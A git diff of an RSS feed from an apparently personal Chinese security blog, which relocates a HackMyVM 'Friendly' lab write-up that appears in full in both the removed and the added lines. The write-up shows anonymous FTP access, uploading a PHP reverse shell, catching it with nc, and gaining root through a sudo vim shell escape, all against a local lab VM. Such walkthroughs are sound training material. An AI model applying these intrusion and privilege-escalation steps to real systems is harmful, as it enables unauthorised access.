@@ -1,5 +1,5 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Triumph Blog</title><link>https://7r1UMPH.github.io</link><description>哪里会有人喜欢孤独，不过是不喜欢失望罢了。</description><copyright>Triumph Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200605137.png</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Mon, 31 Mar 2025 11:14:07 +0000</lastBuildDate><managingEditor>Triumph Blog</managingEditor><ttl>60</ttl><webMaster>Triumph Blog</webMaster><item><title>hackmyvm靶场-Bruteforcelab</title><link>https://7r1UMPH.github.io/post/hackmyvm-ba-chang--Bruteforcelab.html</link><description># 简介
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Triumph Blog</title><link>https://7r1UMPH.github.io</link><description>哪里会有人喜欢孤独，不过是不喜欢失望罢了。</description><copyright>Triumph Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200605137.png</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Mon, 31 Mar 2025 11:15:32 +0000</lastBuildDate><managingEditor>Triumph Blog</managingEditor><ttl>60</ttl><webMaster>Triumph Blog</webMaster><item><title>hackmyvm靶场-Bruteforcelab</title><link>https://7r1UMPH.github.io/post/hackmyvm-ba-chang--Bruteforcelab.html</link><description># 简介
 
 ![image-20250322203846278](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250322203846321.png)
 
@@ -3005,161 +3005,7 @@ They may even have already heard about our achievement, they are everywhere! Tha
 Wishing you a long life, David.
   
 嘿,伙计们！
-经过这么长时间，我做到了。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Immortal.html</guid><pubDate>Thu, 20 Mar 2025 08:10:48 +0000</pubDate></item><item><title>hmv_friendly</title><link>https://7r1UMPH.github.io/post/hmv_friendly.html</link><description># hmv_friendly
-
-# 0.简介
-
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Friendly  
-**难度**：绿色  
-**目标 IP**：192.168.205.129  
-**本机 IP**：192.168.205.128
-
-# 1.扫描
-
-​`nmap`​起手
-
-```
-┌──(kali㉿kali)-[~/test]
-└─$ nmap -sT -Pn -n -p- --min-rate 10000 192.168.205.129  
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:26 CST
-Nmap scan report for 192.168.205.129
-Host is up (0.00059s latency).
-Not shown: 65533 closed tcp ports (conn-refused)
-PORT   STATE SERVICE
-21/tcp open  ftp
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
-
-```
-
-# 2.踩点
-
-先进行ftp匿名登录
-
-```
-┌──(kali㉿kali)-[~/test]
-└─$ ftp 192.168.205.129
-Connected to 192.168.205.129.
-220 ProFTPD Server (friendly) [::ffff:192.168.205.129]
-Name (192.168.205.129:kali): anonymous
-331 Anonymous login ok, send your complete email address as your password
-Password: 
-230 Anonymous access granted, restrictions apply
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&gt; ls -la
-229 Entering Extended Passive Mode (|||17885|)
-150 Opening ASCII mode data connection for file list
-drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
-drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
--rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-
-```
-
-和我们发现的网页目录架构一样，我们可以尝试上传一个反弹shell上去访问
-
-```
-ftp&gt; put php.php 
-local: php.php remote: php.php
-229 Entering Extended Passive Mode (|||22559|)
-150 Opening BINARY mode data connection for php.php
-100% |*****************************************************************************************|  2596      255.89 KiB/s    00:00 ETA
-226 Transfer complete
-2596 bytes sent in 00:00 (241.58 KiB/s)
-ftp&gt; ls
-229 Entering Extended Passive Mode (|||7798|)
-150 Opening ASCII mode data connection for file list
--rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
--rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
-226 Transfer complete
-
-```
-
-访问
-
-```
-┌──(kali㉿kali)-[~/test]
-└─$ nc -lvnp 8888
-listening on [any] 8888 ...
-connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 35158
-Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
- 23:33:07 up 7 min,  0 users,  load average: 1.36, 6.63, 3.71
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-bash: cannot set terminal process group (439): Inappropriate ioctl for device
-bash: no job control in this shell
-
-```
-
-# 3. 获得稳定的 Shell
-
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
-
-```bash
-script /dev/null -c bash  
-ctrl+z  
-stty raw -echo; fg  
-reset xterm  
-export TERM=xterm  
-echo $SHELL  
-export SHELL=/bin/bash  
-stty rows 59 cols 236
-```
-
-# 4.提权
-
-```
-www-data@friendly:/$ ls -la
-total 68
-drwxr-xr-x  18 root root  4096 Mar 11  2023 .
-drwxr-xr-x  18 root root  4096 Mar 11  2023 ..
-lrwxrwxrwx   1 root root     7 Feb 21  2023 bin -&gt; usr/bin
-drwxr-xr-x   3 root root  4096 Feb 21  2023 boot
-drwxr-xr-x  17 root root  3140 Feb  2 23:26 dev
-drwxr-xr-x  69 root root  4096 Feb  2 23:26 etc
-drwxr-xr-x   3 root root  4096 Feb 21  2023 home
-lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img -&gt; boot/initrd.img-5.10.0-21-amd64
-lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
-lrwxrwxrwx   1 root root     7 Feb 21  2023 lib -&gt; usr/lib
-lrwxrwxrwx   1 root root     9 Feb 21  2023 lib32 -&gt; usr/lib32
-lrwxrwxrwx   1 root root     9 Feb 21  2023 lib64 -&gt; usr/lib64
-lrwxrwxrwx   1 root root    10 Feb 21  2023 libx32 -&gt; usr/libx32
-drwx------   2 root root 16384 Feb 21  2023 lost+found
-drwxr-xr-x   3 root root  4096 Feb 21  2023 media
-drwxr-xr-x   2 root root  4096 Feb 21  2023 mnt
-drwxr-xr-x   2 root root  4096 Feb 21  2023 opt
-dr-xr-xr-x 145 root root     0 Feb  2 23:26 proc
-drwx------   3 root root  4096 Mar 11  2023 root
-drwxr-xr-x  17 root root   540 Feb  2 23:26 run
-lrwxrwxrwx   1 root root     8 Feb 21  2023 sbin -&gt; usr/sbin
-drwxr-xr-x   2 root root  4096 Mar 11  2023 srv
-dr-xr-xr-x  13 root root     0 Feb  2 23:26 sys
-drwxrwxrwt   2 root root  4096 Feb  2 23:26 tmp
-drwxr-xr-x  14 root root  4096 Feb 21  2023 usr
-drwxr-xr-x  12 root root  4096 Feb 21  2023 var
-lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-21-amd64
-lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
-www-data@friendly:/$ sudo -l
-Matching Defaults entries for www-data on friendly:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User www-data may run the following commands on friendly:
-    (ALL : ALL) NOPASSWD: /usr/bin/vim
-
-```
-
-![image](assets/image-20250203123641-1hov8b3.png)
-
-🔗https://gtfobins.github.io/gtfobins/vim/#sudo
-
-```
-www-data@friendly:/$ sudo vim -c ':!/bin/sh'
-
-# id
-uid=0(root) gid=0(root) groups=0(root)
-
-```。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_friendly.html</guid><pubDate>Thu, 20 Mar 2025 08:08:45 +0000</pubDate></item><item><title>hmv_friendly2</title><link>https://7r1UMPH.github.io/post/hmv_friendly2.html</link><description># hmv_friendly2
+经过这么长时间，我做到了。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Immortal.html</guid><pubDate>Thu, 20 Mar 2025 08:10:48 +0000</pubDate></item><item><title>hmv_friendly2</title><link>https://7r1UMPH.github.io/post/hmv_friendly2.html</link><description># hmv_friendly2
 
 # 0.简介
 
@@ -6494,7 +6340,155 @@ jan:~# id
 uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 ```
 
-&lt;!-- ##{'timestamp':1738666533}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/panghu.html</guid><pubDate>Tue, 04 Feb 2025 10:55:33 +0000</pubDate></item><item><title>Listen</title><link>https://7r1UMPH.github.io/post/Listen.html</link><description># 0.简介
+&lt;!-- ##{'timestamp':1738666533}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/panghu.html</guid><pubDate>Tue, 04 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_friendly</title><link>https://7r1UMPH.github.io/post/hmv_friendly.html</link><description># 0.简介
+
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Friendly
+ 难度：绿色
+ 目标 IP：192.168.205.129
+ 本机 IP：192.168.205.128
+
+# 1.扫描
+
+nmap起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT -Pn -n -p- --min-rate 10000 192.168.205.129  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:26 CST
+Nmap scan report for 192.168.205.129
+Host is up (0.00059s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
+```
+
+# 2.踩点
+
+先进行ftp匿名登录
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ ftp 192.168.205.129
+Connected to 192.168.205.129.
+220 ProFTPD Server (friendly) [::ffff:192.168.205.129]
+Name (192.168.205.129:kali): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: 
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||17885|)
+150 Opening ASCII mode data connection for file list
+drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
+drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
+-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
+```
+
+和我们发现的网页目录架构一样，我们可以尝试上传一个反弹shell上去访问
+
+```
+ftp&gt; put php.php 
+local: php.php remote: php.php
+229 Entering Extended Passive Mode (|||22559|)
+150 Opening BINARY mode data connection for php.php
+100% |*****************************************************************************************|  2596      255.89 KiB/s    00:00 ETA
+226 Transfer complete
+2596 bytes sent in 00:00 (241.58 KiB/s)
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||7798|)
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
+-rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
+226 Transfer complete
+```
+
+访问
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 35158
+Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
+ 23:33:07 up 7 min,  0 users,  load average: 1.36, 6.63, 3.71
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (439): Inappropriate ioctl for device
+bash: no job control in this shell
+```
+
+# 3. 获得稳定的 Shell
+
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
+
+```bash
+script /dev/null -c bash  
+ctrl+z  
+stty raw -echo; fg  
+reset xterm  
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  
+stty rows 59 cols 236
+```
+
+# 4.提权
+
+```
+www-data@friendly:/$ ls -la
+total 68
+drwxr-xr-x  18 root root  4096 Mar 11  2023 .
+drwxr-xr-x  18 root root  4096 Mar 11  2023 ..
+lrwxrwxrwx   1 root root     7 Feb 21  2023 bin -&gt; usr/bin
+drwxr-xr-x   3 root root  4096 Feb 21  2023 boot
+drwxr-xr-x  17 root root  3140 Feb  2 23:26 dev
+drwxr-xr-x  69 root root  4096 Feb  2 23:26 etc
+drwxr-xr-x   3 root root  4096 Feb 21  2023 home
+lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img -&gt; boot/initrd.img-5.10.0-21-amd64
+lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
+lrwxrwxrwx   1 root root     7 Feb 21  2023 lib -&gt; usr/lib
+lrwxrwxrwx   1 root root     9 Feb 21  2023 lib32 -&gt; usr/lib32
+lrwxrwxrwx   1 root root     9 Feb 21  2023 lib64 -&gt; usr/lib64
+lrwxrwxrwx   1 root root    10 Feb 21  2023 libx32 -&gt; usr/libx32
+drwx------   2 root root 16384 Feb 21  2023 lost+found
+drwxr-xr-x   3 root root  4096 Feb 21  2023 media
+drwxr-xr-x   2 root root  4096 Feb 21  2023 mnt
+drwxr-xr-x   2 root root  4096 Feb 21  2023 opt
+dr-xr-xr-x 145 root root     0 Feb  2 23:26 proc
+drwx------   3 root root  4096 Mar 11  2023 root
+drwxr-xr-x  17 root root   540 Feb  2 23:26 run
+lrwxrwxrwx   1 root root     8 Feb 21  2023 sbin -&gt; usr/sbin
+drwxr-xr-x   2 root root  4096 Mar 11  2023 srv
+dr-xr-xr-x  13 root root     0 Feb  2 23:26 sys
+drwxrwxrwt   2 root root  4096 Feb  2 23:26 tmp
+drwxr-xr-x  14 root root  4096 Feb 21  2023 usr
+drwxr-xr-x  12 root root  4096 Feb 21  2023 var
+lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-21-amd64
+lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
+www-data@friendly:/$ sudo -l
+Matching Defaults entries for www-data on friendly:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on friendly:
+    (ALL : ALL) NOPASSWD: /usr/bin/vim
+```
+
+![image-20250331191435274](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191435317.png)
+
+🔗https://gtfobins.github.io/gtfobins/vim/#sudo
+
+```
+www-data@friendly:/$ sudo vim -c ':!/bin/sh'
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+&lt;!-- ##{'timestamp':1738580133}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_friendly.html</guid><pubDate>Mon, 03 Feb 2025 10:55:33 +0000</pubDate></item><item><title>Listen</title><link>https://7r1UMPH.github.io/post/Listen.html</link><description># 0.简介
 
 这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习
 
